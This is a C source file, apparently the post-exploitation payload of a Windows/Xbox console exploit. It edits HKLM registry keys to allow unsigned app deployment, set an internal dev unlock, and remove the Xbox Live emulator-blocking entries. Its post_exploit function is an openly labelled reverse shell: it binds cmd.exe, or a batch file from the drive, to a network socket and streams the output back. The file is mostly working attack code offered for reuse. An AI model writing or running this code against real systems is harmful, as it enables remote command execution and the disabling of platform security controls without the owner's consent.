#include "post_exploit.h"

#include <Windows.h>
#include <stdio.h>

void regedits() {
    // Enable custom/unsigned app deployment
    DWORD dwMode = 1;
    RegSetKeyValueA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModelUnlock",
        "AllowDevelopmentWithoutDevLicense", REG_DWORD, &dwMode,
        sizeof(dwMode));
    RegSetKeyValueA(HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Policies\\Microsoft\\Windows\\Appx",
                    "AllowDevelopmentWithoutDevLicense", REG_DWORD, &dwMode,
                    sizeof(dwMode));
    DWORD dwDevUnlock = 4;
    RegSetKeyValueA(
        HKEY_LOCAL_MACHINE, "OSDATA\\SOFTWARE\\Microsoft\\SecurityManager",
        "InternalDevUnlock", REG_DWORD, &dwDevUnlock, sizeof(dwDevUnlock));
    DWORD dwValue = 0;
    RegSetKeyValueA(HKEY_LOCAL_MACHINE,
                    "OSDATA\\Software\\Microsoft\\Durango\\LiveSettings",
                    "BlockEmulatorsEnabled", REG_DWORD, &dwValue,
                    sizeof(dwValue));
    RegDeleteKeyValueA(HKEY_LOCAL_MACHINE,
                       "OSDATA\\Software\\Microsoft\\Durango\\LiveSettings",
                       "BlockEmulatorsRestrictedExeSubstrings");
    RegDeleteKeyValueA(HKEY_LOCAL_MACHINE,
                       "OSDATA\\Software\\Microsoft\\Durango\\LiveSettings",
                       "BlockEmulatorsLogOnlyExeSubstrings");
    RegDeleteKeyValueA(HKEY_LOCAL_MACHINE,
                       "OSDATA\\Software\\Microsoft\\Durango\\LiveSettings",
                       "BlockEmulatorsPublisherPackageStrings");
}

void write_to_socket_and_file(HANDLE hPipe, SOCKET sock, HANDLE hFile) {
    char buffer[16];
    DWORD bytesRead;

    while (ReadFile(hPipe, buffer, sizeof(buffer), &bytesRead, NULL) &&
           bytesRead > 0) {
        // Write to socket
        if (sock != INVALID_SOCKET) {
            send(sock, buffer, bytesRead, 0);
        }

        // Write to file
        if (hFile != INVALID_HANDLE_VALUE) {
            WriteFile(hFile, buffer, bytesRead, NULL, NULL);
        }
    }
}

BOOL FileExists(LPCTSTR szPath) {
    DWORD dwAttrib = GetFileAttributes(szPath);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
            !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

// Put your own code in here!
// Provided is a simple reverse shell example
void post_exploit(SOCKET sock, HANDLE outputFile, CHAR drive_path[4]) {
    regedits();

    STARTUPINFOA sinfo;
    PROCESS_INFORMATION pinfo;
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES saAttr;

    // Set the security attributes to allow the handle to be inherited
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    // Create an anonymous pipe
    if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
        write_msg(sock, outputFile, "Failed to create pipe\n");
        return;
    }

    // Ensure the read handle to the pipe is not inherited
    if (!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
        write_msg(sock, outputFile, "Failed to set handle information\n");
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return;
    }

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdInput = (HANDLE)sock;
    sinfo.hStdOutput = hWritePipe;
    sinfo.hStdError = hWritePipe;

    // Concatenate the drive letter with the command
    char command[50];
    if (!FileExists(strcat(drive_path, "\\exc.bat"))) {
        strcpy(command, "cmd.exe");
    } else {
        sprintf(command, "cmd.exe /C %s\\exc.bat", drive_path);
    }

    if (!CreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, drive_path,
                        &sinfo, &pinfo)) {
        write_msg(sock, outputFile, "Failed to create process\n");
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return;
    }

    CloseHandle(hWritePipe);

    write_to_socket_and_file(hReadPipe, sock, outputFile);

    // Wait for the process to finish
    WaitForSingleObject(pinfo.hProcess, INFINITE);

    DWORD exit_code;
    if (!GetExitCodeProcess(pinfo.hProcess, &exit_code)) {
        write_msg(sock, outputFile, "Failed to get exit code\n");
    } else {
        char msg[50];
        sprintf(msg, "Process exited with code %d\n", exit_code);
        write_msg(sock, outputFile, msg);
    }

    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
    CloseHandle(hReadPipe);
    CloseHandle(outputFile);
    closesocket(sock);
    return;
}
